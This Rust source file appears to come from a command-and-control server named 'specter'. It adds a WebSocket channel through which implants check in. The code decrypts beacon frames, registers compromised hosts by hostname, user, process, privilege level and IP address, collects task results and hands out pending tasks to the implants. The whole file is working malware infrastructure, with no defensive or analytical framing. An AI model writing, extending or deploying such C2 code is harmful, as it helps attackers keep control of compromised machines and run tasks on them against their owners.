//! WebSocket upgrade handler for the HTTP listener.
//!
//! Adds WebSocket upgrade support to the existing HTTP listener so that
//! implants using the WebSocket channel can connect. Uses axum's built-in
//! WebSocket extraction to handle the HTTP Upgrade handshake, then processes
//! binary frames as encrypted check-in messages (same wire format as /api/beacon).

use axum::extract::ws::{Message, WebSocket};
use axum::extract::{State, WebSocketUpgrade};
use axum::response::IntoResponse;

use chacha20poly1305::aead::{Aead, KeyInit};
use chacha20poly1305::{ChaCha20Poly1305, Nonce};

use specter_common::checkin::{CheckinRequest, CheckinResponse, PendingTaskPayload};

use super::HttpState;

// Wire protocol constants (same as beacon handler)
const WIRE_LEN_SIZE: usize = 4;
const WIRE_IMPLANT_ID_SIZE: usize = 12;
const WIRE_NONCE_SIZE: usize = 12;
const WIRE_HEADER_SIZE: usize = WIRE_IMPLANT_ID_SIZE + WIRE_NONCE_SIZE;
const WIRE_TAG_SIZE: usize = 16;
const BEACON_MIN_SIZE: usize = WIRE_LEN_SIZE + WIRE_HEADER_SIZE + WIRE_TAG_SIZE;

/// Axum handler for WebSocket upgrade requests.
/// The implant sends an HTTP Upgrade request with Sec-WebSocket-Key;
/// axum validates the handshake and calls our handler with an active WebSocket.
pub async fn ws_upgrade_handler(
    ws: WebSocketUpgrade,
    State(state): State<HttpState>,
) -> impl IntoResponse {
    ws.on_upgrade(move |socket| handle_ws_connection(socket, state))
}

/// Handle an active WebSocket connection.
/// Each binary frame is treated as an encrypted beacon message.
async fn handle_ws_connection(mut socket: WebSocket, state: HttpState) {
    tracing::debug!("WebSocket connection established");

    while let Some(msg) = socket.recv().await {
        let msg = match msg {
            Ok(m) => m,
            Err(e) => {
                tracing::debug!("WebSocket recv error: {e}");
                break;
            }
        };

        match msg {
            Message::Binary(data) => {
                let response = process_ws_beacon(&data, &state).await;
                match response {
                    Some(resp_data) => {
                        if socket
                            .send(Message::Binary(resp_data))
                            .await
                            .is_err()
                        {
                            break;
                        }
                    }
                    None => {
                        // Send empty ack
                        if socket.send(Message::Binary(vec![])).await.is_err() {
                            break;
                        }
                    }
                }
            }
            Message::Ping(payload) => {
                if socket.send(Message::Pong(payload)).await.is_err() {
                    break;
                }
            }
            Message::Close(_) => {
                tracing::debug!("WebSocket close received");
                break;
            }
            _ => {
                // Ignore text and other frame types
            }
        }
    }

    tracing::debug!("WebSocket connection closed");
}

/// Process a binary WebSocket frame as an encrypted beacon message.
/// Same wire format as the HTTP /api/beacon endpoint.
async fn process_ws_beacon(data: &[u8], state: &HttpState) -> Option<Vec<u8>> {
    if data.len() < BEACON_MIN_SIZE {
        tracing::debug!("WebSocket beacon too short: {} bytes", data.len());
        return None;
    }

    // Parse wire format: [4-byte LE length][12-byte implant_id][12-byte nonce][ciphertext][16-byte tag]
    let wire_len = u32::from_le_bytes([data[0], data[1], data[2], data[3]]) as usize;

    if data.len() < WIRE_LEN_SIZE + wire_len {
        return None;
    }

    let implant_id_prefix = &data[WIRE_LEN_SIZE..WIRE_LEN_SIZE + WIRE_IMPLANT_ID_SIZE];
    let nonce_bytes = &data[WIRE_LEN_SIZE + WIRE_IMPLANT_ID_SIZE..WIRE_LEN_SIZE + WIRE_HEADER_SIZE];

    let ct_len = wire_len.saturating_sub(WIRE_HEADER_SIZE + WIRE_TAG_SIZE);
    let ct_start = WIRE_LEN_SIZE + WIRE_HEADER_SIZE;
    let ct_end = ct_start + ct_len;
    let tag_start = ct_end;
    let tag_end = tag_start + WIRE_TAG_SIZE;

    if tag_end > data.len() {
        return None;
    }

    let ciphertext = &data[ct_start..ct_end];
    let tag = &data[tag_start..tag_end];

    // Derive session key using the same approach as the beacon handler
    let (session_key, _session_id) = super::derive_session_key(state, implant_id_prefix)
        .await
        .ok()?;

    // Decrypt
    let cipher = ChaCha20Poly1305::new_from_slice(&session_key).ok()?;
    let nonce = Nonce::from_slice(nonce_bytes);

    let mut ct_with_tag = Vec::with_capacity(ct_len + WIRE_TAG_SIZE);
    ct_with_tag.extend_from_slice(ciphertext);
    ct_with_tag.extend_from_slice(tag);

    let plaintext = cipher.decrypt(nonce, ct_with_tag.as_slice()).ok()?;

    tracing::debug!(
        "WebSocket beacon from implant {:02x?}",
        &implant_id_prefix[..4]
    );

    // Parse decrypted JSON check-in
    let checkin_req: CheckinRequest = serde_json::from_slice(&plaintext).ok()?;

    // Register or update session
    let session_id = match &_session_id {
        Some(id) => {
            if let Err(e) = state.session_manager.update_checkin(id).await {
                tracing::error!("WS beacon update error: {e}");
            }
            id.clone()
        }
        None => state
            .session_manager
            .register_or_update(
                &checkin_req.hostname,
                &checkin_req.username,
                checkin_req.pid,
                &checkin_req.os_version,
                &checkin_req.integrity_level,
                &checkin_req.process_name,
                &checkin_req.internal_ip,
                &checkin_req.external_ip,
            )
            .await
            .ok()?,
    };

    // Process task results
    for tr in &checkin_req.task_results {
        let success = tr.status == "COMPLETE";
        if let Err(e) = state
            .task_dispatcher
            .complete_task(&tr.task_id, tr.result.as_bytes(), success)
            .await
        {
            tracing::warn!("WS: failed to complete task {}: {e}", tr.task_id);
        }
    }

    // Fetch pending tasks
    let pending = state
        .task_dispatcher
        .get_pending_tasks(&session_id)
        .await
        .unwrap_or_default();

    let mut tasks_payload = Vec::new();
    for t in &pending {
        let _ = state.task_dispatcher.mark_dispatched(&t.id).await;
        tasks_payload.push(PendingTaskPayload {
            task_id: t.id.clone(),
            task_type: t.task_type.clone(),
            arguments: String::from_utf8_lossy(&t.arguments).to_string(),
        });
    }

    let resp = CheckinResponse {
        session_id,
        tasks: tasks_payload,
    };

    // Serialize and encrypt response
    let resp_json = serde_json::to_vec(&resp).ok()?;

    let resp_nonce_bytes: [u8; 12] = rand::random();
    let resp_nonce = Nonce::from_slice(&resp_nonce_bytes);
    let encrypted = cipher.encrypt(resp_nonce, resp_json.as_slice()).ok()?;

    // Build wire response
    let ct_part_len = encrypted.len() - WIRE_TAG_SIZE;
    let resp_ct = &encrypted[..ct_part_len];
    let resp_tag = &encrypted[ct_part_len..];

    let server_pub_bytes = state.server_pubkey.as_bytes();
    let resp_total = WIRE_HEADER_SIZE + resp_ct.len() + WIRE_TAG_SIZE;

    let mut wire_resp = Vec::with_capacity(WIRE_LEN_SIZE + resp_total);
    wire_resp.extend_from_slice(&(resp_total as u32).to_le_bytes());
    wire_resp.extend_from_slice(&server_pub_bytes[..WIRE_IMPLANT_ID_SIZE]);
    wire_resp.extend_from_slice(&resp_nonce_bytes);
    wire_resp.extend_from_slice(resp_ct);
    wire_resp.extend_from_slice(resp_tag);

    Some(wire_resp)
}
